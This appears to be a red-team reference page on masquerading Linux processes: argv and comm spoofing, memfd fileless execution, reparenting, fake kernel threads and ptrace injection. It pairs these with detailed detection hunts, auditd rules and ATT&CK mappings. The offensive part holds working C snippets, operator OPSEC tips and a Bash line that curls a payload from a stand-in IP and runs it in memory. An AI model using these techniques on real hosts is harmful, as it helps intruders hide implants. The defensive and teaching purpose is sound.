# Linux Process Stealth & Masquerading

*Hiding and disguising running processes on Linux - argv/comm manipulation, fileless execution, reparenting, kernel-thread impersonation - and the exact telemetry each trick emits.*

## What & why

The goal is to make an operator's process blend into a busy host: a benign-looking name in `ps`, no suspicious file on disk, a plausible parent, and nothing that screams "implant" to a triaging analyst. The OPSEC rationale is that most host-based detection is pattern matching against process metadata: `comm`/`cmdline`, the resolved `/proc/PID/exe`, the parent process, and the execution syscall sequence. Defeating the cheap signals (a weird argv, an executable in `/tmp`, a shell parented to a web server) buys time. The hard limit: you cannot remove a PID from the kernel's task list from userland. Everything below is masquerading, not invisibility. True PID hiding needs an LKM rootkit or a `/proc` hook, which is loud in its own right (see [You cannot hide a PID](#you-cannot-hide-a-pid-from-the-kernel)) and out of scope here. Cross-reference: [01-disk-and-timestamp-stealth](./01-disk-and-timestamp-stealth.md) for the on-disk side, and [03-persistence-and-reparenting](./03-persistence-and-reparenting.md) for daemon survival.

## Technique

### Process name (comm) vs command line (cmdline)

Linux exposes two distinct "names" for a task, read from two different `/proc` files, populated by two different mechanisms. Confusing them is the most common operator mistake.

- `/proc/PID/comm` - the kernel's `task->comm`, a fixed 16-byte buffer (15 printable chars + NUL). Set at `exec` from the basename of the program, and overwritable at runtime via `prctl(PR_SET_NAME, ...)` or by writing to `/proc/self/comm`. This is what `ps -o comm`, `top`, the parenthesized field in `/proc/PID/stat`, and many EDR agents read by default. It is also what appears in many kernel log lines and in some auditd records as the `comm=` field.
- `/proc/PID/cmdline` - a NUL-separated copy of the original `argv` array, living in the process's own stack memory between `mm->arg_start` and `mm->arg_end`. This is what `ps aux`, `ps -ef`, and `cat /proc/PID/cmdline` show as the "full command". It reflects whatever bytes currently sit in that argv region - which the process can overwrite.

```c
/* set comm (max 15 chars stored, silently truncated) */
#include <sys/prctl.h>
prctl(PR_SET_NAME, "kworker/3:1", 0, 0, 0);   /* task->comm becomes "kworker/3:1" */
```

```bash
# runtime, no compiler needed - write your own comm
echo -n "rcu_sched" > /proc/self/comm
cat /proc/self/comm        # rcu_sched
```

Setting `comm` does **not** change `cmdline`. `ps aux` still shows the real argv. To launder `cmdline` you must overwrite the argv memory region in place.

### Overwriting argv[0] and the argv area

`cmdline` is read from the process's own memory, so an operator can scribble over it. In C, `argv[0]` points into a contiguous region; you can `memset` the whole `argv[0]..argv[argc-1]` span and write a decoy. The kernel computes the readable length from `mm->arg_end - mm->arg_start`, so writing a shorter string leaves trailing NULs - usually fine, sometimes a tell (a genuine kernel thread's `cmdline` is completely empty, not "name plus NUL padding").

```c
#include <string.h>
#include <sys/prctl.h>
int main(int argc, char **argv, char **envp) {
    /* zero the original argv region, then write the decoy */
    char *end = (envp && envp[0]) ? envp[0]
                                  : argv[argc-1] + strlen(argv[argc-1]) + 1;
    size_t span = end - argv[0];
    memset(argv[0], 0, span);
    strncpy(argv[0], "[kworker/u8:2-events]", span - 1);
    prctl(PR_SET_NAME, "kworker/u8:2", 0, 0, 0);  /* keep ps -o comm consistent */
    for (;;) pause();
}
```

Tooling equivalents: Perl `$0 = "..."`, Python `setproctitle.setproctitle(...)` (which performs the same argv-region overwrite plus `prctl` under the hood), Go argv0 hacks. Extending the title beyond the original argv length requires clobbering the environ region too, which truncates `/proc/PID/environ` and is itself anomalous.

### Fileless / in-memory execution with memfd_create + fexecve

`memfd_create(2)` returns a file descriptor backed by an anonymous, RAM-resident file with no path on any filesystem. Write an ELF into it, then execute it via `fexecve(2)` (or `execveat(fd, "", ..., AT_EMPTY_PATH)`). Nothing touches disk.

```c
#define _GNU_SOURCE
#include <sys/mman.h>     /* memfd_create */
#include <unistd.h>       /* write, fexecve */
int fd = memfd_create("", MFD_CLOEXEC);   /* empty name -> appears as memfd: */
write(fd, elf_buf, elf_len);              /* payload arrived over the socket, never to disk */
char *argv[] = {"[kworker/1:0]", NULL};
char *envp[] = {NULL};
fexecve(fd, argv, envp);                  /* exec the in-memory ELF */
```

After `fexecve`, the new process's `/proc/PID/exe` symlink resolves to something like `/memfd:<name> (deleted)`. The `(deleted)` suffix together with the `memfd:` backing is the single loudest artifact on this page - see [Detection](#detection--telemetry).

Shell-only variant (Bash) using the dynamic loader and a file descriptor instead of a named path:

```bash
# fetch an ELF, hand it to ld.so via a file descriptor - never named on disk
# (illustrative; many hardened distros block exec from /dev/fd or memfd)
exec 3< <(curl -s http://198.51.100.10/payload.elf)
/lib64/ld-linux-x86-64.so.2 /dev/fd/3
```

Running an ELF from a pipe or `/dev/fd` is the same idea: the dynamic loader (`ld.so`) is invoked explicitly with a file descriptor as its argument, so the "executable" never exists as a named path. `/proc/PID/exe` then points at `ld-linux` or at a `pipe:[inode]` / `/dev/fd/N (deleted)` target.

### Daemonizing, setsid, and double-fork reparenting

To detach from the spawning shell or web server (so the parent becomes `1`/`systemd` instead of `apache2`), use the classic daemon sequence: `fork`, parent exits, child `setsid()` to become a session leader detached from the controlling TTY, optionally `fork` again so the final process is not a session leader and can never reacquire a TTY. When the intermediate parent exits, the kernel reparents the orphan to PID 1 (or to the nearest `PR_SET_CHILD_SUBREAPER` ancestor).

```c
#include <unistd.h>
if (fork() > 0) _exit(0);     /* parent dies; child is orphaned */
setsid();                     /* new session, detach controlling TTY */
if (fork() > 0) _exit(0);     /* not a session leader -> cannot get a TTY */
chdir("/"); umask(0);
/* close 0/1/2, reopen them to /dev/null */
```

Shell shorthands: `setsid -f <cmd>`, `nohup <cmd> &` then `disown`, or `( cmd & )` inside a subshell. The effect is the same - the child shows `PPID 1`. Beware: a normally short-lived utility now parented to `systemd` and holding a network socket is itself an anomaly (see OPSEC).

### Masquerading as a kernel thread

Kernel threads have names rendered by `ps` in square brackets - `[kworker/0:1]`, `[ksoftirqd/2]`, `[rcu_sched]`. Operators copy these into `comm`/argv to hide in the noise of `ps aux`. This is shallow cover:

- Real kernel threads have **PPID 2** (`[kthreadd]`); userland fakes have PPID 1 or a normal parent. `ps -o pid,ppid,comm` exposes this instantly.
- Real kernel threads have an **empty** `/proc/PID/cmdline` (zero bytes), an empty `/proc/PID/maps` (no userland address space), and a `/proc/PID/exe` that does not resolve. A fake `[kworker]` has a populated `cmdline`, real memory maps, and a resolvable `exe`. That mismatch is a high-fidelity hunt (below).
- Real kernel threads have `VmSize: 0 kB` in `/proc/PID/status` and the `PF_KTHREAD` task flag, which userland cannot set.

So `[kworker/...]` lowers the bar against a human eyeballing `top`, but raises a flare to any automated check that compares `cmdline`-emptiness and `maps`-emptiness against the bracketed `comm`.

### "Hollowing" on Linux via ptrace

There is no Windows-style process hollowing on Linux, but the analogue is injecting into a live, benign, already-running process with `ptrace(2)`: `PTRACE_ATTACH`/`PTRACE_SEIZE`, then `PTRACE_POKETEXT`/`process_vm_writev` to write a stager, hijack RIP/registers with `PTRACE_SETREGS`, and resume. The host keeps its original `comm`, `cmdline`, `exe`, and PID, so static metadata checks see nothing. The cost is that `ptrace` is heavily instrumented and frequently restricted by `kernel.yama.ptrace_scope` (0 = classic, 1 = child-only, 2 = admin-only, 3 = disabled).

```bash
sysctl kernel.yama.ptrace_scope     # 1 on most modern distros - blocks non-child attach
```

### You cannot hide a PID from the kernel

Userland tricks never remove the task from the scheduler or from `/proc`. The only ways to make a PID truly invisible to `ps`:

- `LD_PRELOAD` a shim that hooks `readdir`/`readdir64` to filter `/proc/PID` entries (libprocesshider style). Tells: an entry in `/etc/ld.so.preload`, an unexpected `LD_PRELOAD` value in `/proc/PID/environ`, and the hidden PID still appearing to any tool that bypasses libc and reads `/proc` via raw `getdents64` (`ls -f /proc`, `find /proc -maxdepth 1`).
- An LKM/eBPF rootkit hooking `getdents64`/`/proc` iteration in kernel space. Tells: `lsmod` gaps versus `/sys/module`, tracepoint/kprobe hooks in `/sys/kernel/tracing`, kallsyms anomalies, and kernel-module-load events in Falco/Tracee. Out of scope here.

Bottom line: a careful `getdents64` walk of `/proc` plus a cross-check of `comm`/`cmdline`/`exe`/`maps` defeats every userland method on this page.

## OPSEC notes

The loud version: drop an ELF in `/tmp`, `chmod +x`, run it under its real name, parented to the shell, argv intact. That is four independent detections firing at once (world-writable exec path, a new executable file, an anomalous parent, a malicious argv).

The quiet version layers the techniques but accepts their residual tells:

- **memfd is silent on disk but extremely loud to runtime sensors.** No file is created, so file-integrity and disk-forensic tooling miss it. But the `memfd_create` -> `write` -> `execve(fd)` sequence is exactly what eBPF agents (Falco, Tracee, modern EDR) hunt for, and `/proc/PID/exe` resolving to `memfd:... (deleted)` is unambiguous. You traded a disk artifact for a high-confidence runtime signature - only a win against disk-only defenders.
- **`comm`/argv spoofing is cheap and shallow.** It fools `ps aux` skimming and string-matching rules, but any tool that resolves `/proc/PID/exe` or compares `comm` to `exe` basename sees the lie immediately. Keep `comm` and the laundered `cmdline` consistent or you produce a `comm`-versus-`cmdline` mismatch that is itself a hunt.
- **kthread impersonation is the riskiest masquerade.** `[kworker/...]` with PPID != 2, a non-empty `cmdline`, a non-empty `maps`, or a resolvable `exe` is a near-zero-false-positive detection. Many mature SOCs hunt this specifically. Use it only against immature monitoring.
- **Reparenting to PID 1 erases the real parent forever.** The `apache2 -> sh` chain that screams "webshell" disappears, but a short-lived binary now parented to `systemd` while holding an outbound socket is its own anomaly, and the `setsid`/double-fork pattern (a process that orphans itself immediately after exec) is detectable via process-lineage telemetry.
- **ptrace injection leaves the cleanest metadata but the dirtiest syscalls.** `ptrace`/`process_vm_writev` against a non-child target, especially writing to executable memory, is rare in normal workloads and is flagged by auditd and EDR. `yama.ptrace_scope >= 1` blocks it outright unless you are root or the target is your own child.

General failure modes: trailing NUL padding in a faked `cmdline`; an `exe` symlink that still resolves to `/tmp` or `(deleted)`; mismatched `comm` and `exe` basenames; environ truncation from over-long argv; and the simple fact that `/proc` enumeration via raw syscalls always lists you.

## Detection & telemetry

This is where the masquerade dies. Hunt the invariants the operator cannot fully control.

### Fileless execution (memfd / deleted exe)

Resolve every running process's `exe` symlink and flag anonymous or deleted backing. This single check catches memfd, run-from-pipe, and delete-then-run.

```bash
# any process whose backing executable is memfd-backed or unlinked
for p in /proc/[0-9]*; do
  tgt=$(readlink "$p/exe" 2>/dev/null)
  case "$tgt" in
    *memfd:*|*"(deleted)"*) echo "$p -> $tgt" ;;
  esac
done
```

osquery equivalent (the `process_events` and `processes` tables expose this):

```sql
-- osquery: live processes whose on-disk executable no longer exists / is anonymous
SELECT pid, name, path, cmdline
FROM processes
WHERE on_disk = 0 OR path LIKE '%(deleted)%' OR path LIKE '%memfd:%';
```

auditd - watch the execution syscalls and inspect the resolved path in the `EXECVE`/`SYSCALL` records. With `--proctitle` enabled (default on modern auditd), each event carries a `PROCTITLE` record, and `SYSCALL` records carry `comm=`, `exe=`, `ppid=`, `auid=`, `key=`:

```bash
# /etc/audit/rules.d/fileless.rules
-a always,exit -F arch=b64 -S execve,execveat -F key=exec_watch
-a always,exit -F arch=b32 -S execve,execveat -F key=exec_watch
# memfd_create itself (catches the creation step before exec)
-a always,exit -F arch=b64 -S memfd_create -F key=memfd_create
```

```bash
ausearch -k exec_watch -i | grep -E 'exe=.*(memfd:|\(deleted\))'
```

Falco ships a built-in rule for this: **"Fileless execution via memfd_create"** (and related anonymous-exec rules), keyed on the `proc.is_exe_from_memfd` / `proc.exe` fields. Tracee emits the equivalent via its `fileless_execution` / `proc_mem`-style events. Modern EDRs surface it as an "executed from memory / anonymous file" detection.

### comm vs cmdline vs exe mismatch

Hunt processes where the kernel name, the argv, and the executable disagree.

```bash
# flag any process whose comm basename != exe basename (laundered name)
for p in /proc/[0-9]*; do
  comm=$(tr -d '\0' < "$p/comm" 2>/dev/null)
  exe=$(basename "$(readlink "$p/exe" 2>/dev/null)" 2>/dev/null)
  [ -n "$exe" ] && [ "$comm" != "${exe%% *}" ] && echo "PID $(basename "$p") comm=$comm exe=$exe"
done
```

### Fake kernel-thread hunt (highest fidelity)

A real kernel thread has PPID 2, empty `cmdline`, empty `maps`, and an unresolvable `exe`. Any bracketed `comm` that violates these is an impostor.

```bash
# bracketed name (kthread style) but with userland address space = impostor
for p in /proc/[0-9]*; do
  comm=$(tr -d '\0' < "$p/comm" 2>/dev/null)
  case "$comm" in
    kworker*|ksoftirqd*|rcu_*|migration*|kthreadd|"["*)
      ppid=$(awk '/^PPid:/{print $2}' "$p/status" 2>/dev/null)
      cl=$(tr -d '\0' < "$p/cmdline" 2>/dev/null)
      # real kthreads: ppid 2 AND empty cmdline. Anything else is fake.
      if [ "$ppid" != "2" ] || [ -n "$cl" ]; then
        echo "SUSPECT PID $(basename "$p") comm=$comm ppid=$ppid cmdline=[$cl]"
      fi ;;
  esac
done
```

Sigma-style logic (process_creation): `Image` resolves to a bracketed/kthread name while `ParentImage` is not the kernel scheduler and a real `CommandLine` is present. KQL over a Sysmon-for-Linux feed (`Microsoft-Windows-Sysmon/Operational` mapped to Linux Event ID 1, process creation):

```kql
DeviceProcessEvents
| where ProcessCommandLine has_any ("[kworker", "[ksoftirqd", "[rcu_")
| where InitiatingProcessId != 2          // real kthreads are children of kthreadd (PID 2)
| where isnotempty(ProcessCommandLine)    // real kthreads have empty cmdline
| project Timestamp, DeviceName, ProcessId, InitiatingProcessId, FileName, ProcessCommandLine
```

### Sysmon for Linux

`sysmon` on Linux writes to journald/`syslog` and key event IDs are: **Event ID 1** (Process creation - `Image`, `CommandLine`, `CurrentDirectory`, `ParentImage`, `ParentProcessId`, `Hashes`), **Event ID 5** (Process terminated), **Event ID 10** (Process access - the `ptrace`/`process_vm_readv|writev` injection signal), **Event ID 11** (File create). The `Image` field after a memfd exec shows the anonymous/deleted backing, and EID 10 with `SourceImage` differing from `TargetImage` plus high-rights access masks is the ptrace-injection tell.

### ptrace / injection

auditd rule for cross-process `ptrace` and memory writes:

```bash
# /etc/audit/rules.d/inject.rules
-a always,exit -F arch=b64 -S ptrace -F key=ptrace_watch
-a always,exit -F arch=b64 -S process_vm_writev -F key=mem_write
```

```bash
ausearch -k ptrace_watch -i        # review a2 (PTRACE_POKETEXT/SETREGS) and target pid
```

Falco rules `"PTRACE attached to process"` and `"PTRACE anti-debug attempt"` cover this from eBPF. EDRs flag `process_vm_writev` into a process the source did not fork.

### Reparenting / orphan anomalies

Hunt processes with PPID 1 that hold network sockets and were spawned by a service that should not daemonize, and the immediate-orphan pattern (exec followed within milliseconds by parent exit). Process-lineage tools (Sysmon EID 1 parent chain, EDR process trees, `ss -tnp` cross-referenced with PPID) expose a network-listening binary reparented to `systemd`.

### LD_PRELOAD ps-hiding

```sql
-- osquery: unexpected global preload, and per-process injected libraries
SELECT * FROM file WHERE path = '/etc/ld.so.preload';
SELECT pid, name, key, value FROM process_envs WHERE key = 'LD_PRELOAD';
```

A `/proc` walk via raw `getdents64` (which libc preload hooks cannot intercept) that lists more PIDs than `ps` is definitive proof of userland PID hiding.

## MITRE ATT&CK

- **T1036.004** - Masquerading: Masquerade Task or Service (kernel-thread / service name impersonation)
- **T1036.005** - Masquerading: Match Legitimate Name or Location
- **T1620** - Reflective Code Loading (memfd/in-memory ELF execution)
- **T1055.008** - Process Injection: Ptrace System Calls
- **T1055.009** - Process Injection: Proc Memory
- **T1564.001** - Hide Artifacts: Hidden Files and Directories (LD_PRELOAD `/proc` filtering, ld.so.preload)
- **T1574.006** - Hijack Execution Flow: Dynamic Linker Hijacking (LD_PRELOAD)
- **T1014** - Rootkit (LKM/eBPF kernel PID hiding, referenced as out-of-scope)
- **T1070.004** - Indicator Removal: File Deletion (delete-then-run / `(deleted)` exe)

## References

- prctl(2) - PR_SET_NAME and process control. https://man7.org/linux/man-pages/man2/prctl.2.html
- memfd_create(2) - anonymous in-memory files. https://man7.org/linux/man-pages/man2/memfd_create.2.html
- execveat(2) / fexecve(3) - execute by file descriptor, AT_EMPTY_PATH. https://man7.org/linux/man-pages/man2/execveat.2.html and https://man7.org/linux/man-pages/man3/fexecve.3.html
- proc(5) - /proc/PID/comm, cmdline, exe, maps, status semantics. https://man7.org/linux/man-pages/man5/proc.5.html
- ptrace(2) and Yama ptrace_scope. https://man7.org/linux/man-pages/man2/ptrace.2.html and https://www.kernel.org/doc/Documentation/admin-guide/LSM/Yama.rst
- Falco default ruleset (Fileless execution via memfd_create, PTRACE rules). https://github.com/falcosecurity/rules
- Aqua Tracee - fileless and proc-memory detection events. https://aquasecurity.github.io/tracee/
- MITRE ATT&CK - Reflective Code Loading (T1620), Process Injection (T1055), Masquerading (T1036). https://attack.mitre.org/techniques/T1620/
- Sysmon for Linux - event IDs and configuration. https://github.com/Sysinternals/SysmonForLinux
